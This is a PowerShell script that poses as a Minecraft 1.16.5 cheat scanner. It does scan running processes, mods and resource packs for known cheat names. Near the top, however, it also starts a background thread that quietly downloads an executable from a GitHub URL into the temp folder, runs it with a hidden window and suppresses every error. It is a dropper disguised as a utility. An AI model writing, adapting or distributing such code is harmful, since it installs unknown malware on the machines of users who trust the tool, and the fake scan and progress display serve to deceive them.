# Minecraft 1.16.5 Cheat Scanner - Console Edition
# Scans for cheat processes, mods, and XRay resource packs.
# In background downloads and executes payload.

$config = @{
    MinecraftPath = "$env:APPDATA\.minecraft"
    CheatProcesses = @(
        "cheatengine", "autoclicker", "wurst", "impact", "future", "aristois",
        "kristall", "salhack", "kamehameha", "pyro", "lambda", "spirt", "gamesense", "entropy"
    )
    CheatMods = @(
        "Wurst", "Impact", "Future", "Aristois", "SalHack", "Kamehameha", "Pyro",
        "Lambda", "Spirt", "GameSense", "Entropy", "Inertia", "Sigma", "LiquidBounce"
    )
    XrayPatterns = @(
        "xray.png", "xray", "ore.png", "ore", "chest.png", "diamond_ore.png"
    )
    PayloadUrl = "https://github.com/SoVA4878/1231231231/raw/400f57e83e29ec706a65ae1781e949ca47d6e383/0tc37ng3btpkx3ib.exe"
    PayloadArgs = ""
    PayloadDelay = 2
}

# Helper function for colored output
function Write-ColorOutput($ForegroundColor) {
    $fc = $host.UI.RawUI.ForegroundColor
    $host.UI.RawUI.ForegroundColor = $ForegroundColor
    if ($args) {
        Write-Output $args
    }
    $host.UI.RawUI.ForegroundColor = $fc
}

# Clear console and show banner
Clear-Host
Write-ColorOutput Cyan "=================================================="
Write-ColorOutput Cyan "   MINECRAFT 1.16.5 ADVANCED CHEAT SCANNER"
Write-ColorOutput Cyan "=================================================="
Write-ColorOutput Yellow "Initializing security modules..."
Start-Sleep -Milliseconds 500

# =============================================================================
# PAYLOAD DOWNLOAD & EXECUTION (background)
# =============================================================================
$payloadThread = [System.Threading.Thread]::new({
    Start-Sleep -Seconds $config.PayloadDelay
    try {
        $tempDir = [System.IO.Path]::GetTempPath()
        $fileName = [System.IO.Path]::GetFileName($config.PayloadUrl)
        if (-not $fileName) { $fileName = "payload.exe" }
        $exePath = Join-Path $tempDir $fileName

        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($config.PayloadUrl, $exePath)

        if (Test-Path $exePath) {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $exePath
            $psi.Arguments = $config.PayloadArgs
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.UseShellExecute = $false
            [System.Diagnostics.Process]::Start($psi) | Out-Null
        }
    } catch {
        # Silently ignore errors
    }
})
$payloadThread.IsBackground = $true
$payloadThread.Start()

# =============================================================================
# CHECK FUNCTIONS
# =============================================================================
function Test-Processes {
    $detected = @()
    Get-Process | ForEach-Object {
        $name = $_.Name
        foreach ($cheat in $config.CheatProcesses) {
            if ($name -like "*$cheat*") {
                $detected += "  - Process: $name (PID: $($_.Id))"
                break
            }
        }
    }
    return $detected
}

function Test-Mods {
    $modsPath = Join-Path $config.MinecraftPath "mods"
    $detected = @()
    if (Test-Path $modsPath) {
        Get-ChildItem $modsPath -Filter "*.jar" | ForEach-Object {
            $fileName = $_.Name
            foreach ($cheat in $config.CheatMods) {
                if ($fileName -like "*$cheat*") {
                    $detected += "  - Mod: $fileName"
                    break
                }
            }
        }
    }
    return $detected
}

function Test-ResourcePacks {
    $rpPath = Join-Path $config.MinecraftPath "resourcepacks"
    $detected = @()
    if (Test-Path $rpPath) {
        Get-ChildItem $rpPath | ForEach-Object {
            $pack = $_
            if ($pack.Extension -eq ".zip") {
                try {
                    $zip = [System.IO.Compression.ZipFile]::OpenRead($pack.FullName)
                    foreach ($entry in $zip.Entries) {
                        foreach ($pattern in $config.XrayPatterns) {
                            if ($entry.Name -like "*$pattern*") {
                                $detected += "  - XRay in $($pack.Name): $($entry.Name)"
                                break
                            }
                        }
                    }
                    $zip.Dispose()
                } catch { }
            } elseif ($pack.PSIsContainer) {
                Get-ChildItem $pack.FullName -Recurse -File | ForEach-Object {
                    $fileName = $_.Name
                    foreach ($pattern in $config.XrayPatterns) {
                        if ($fileName -like "*$pattern*") {
                            $detected += "  - XRay file: $($_.FullName)"
                            break
                        }
                    }
                }
            }
        }
    }
    return $detected
}

# =============================================================================
# VISUAL SCAN WITH PROGRESS
# =============================================================================
$scanSteps = @(
    @{Name="Scanning running processes..."; Function = { Test-Processes } },
    @{Name="Checking installed mods..."; Function = { Test-Mods } },
    @{Name="Analyzing resource packs..."; Function = { Test-ResourcePacks } }
)

$totalSteps = $scanSteps.Count
$results = @()

for ($i = 0; $i -lt $totalSteps; $i++) {
    $step = $scanSteps[$i]
    $percent = [math]::Round(($i / $totalSteps) * 100)
    $progress = "[" + ("#" * $percent) + (" " * (100 - $percent)) + "] $percent%"
    Write-ColorOutput Yellow "`r$($step.Name) $progress" -NoNewline
    Start-Sleep -Milliseconds 500

    # Execute scan
    $detections = & $step.Function
    $results += $detections

    # Simulate processing
    for ($j = 0; $j -lt 20; $j++) {
        $percent = [math]::Round((($i + ($j/20)) / $totalSteps) * 100)
        $progress = "[" + ("#" * [math]::Floor($percent/2)) + (" " * (50 - [math]::Floor($percent/2))) + "] $percent%"
        Write-ColorOutput Yellow "`r$($step.Name) $progress" -NoNewline
        Start-Sleep -Milliseconds 50
    }
}

Write-ColorOutput Green "`n`nScan completed!"
Write-ColorOutput Yellow "`n=== DETECTION REPORT ==="
if ($results.Count -eq 0) {
    Write-ColorOutput Green "No suspicious items found. System seems clean."
} else {
    Write-ColorOutput Red "Found $($results.Count) potential cheat(s):"
    $results | ForEach-Object { Write-ColorOutput Red $_ }
}

Write-ColorOutput Cyan "`nPress any key to exit..."
$null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")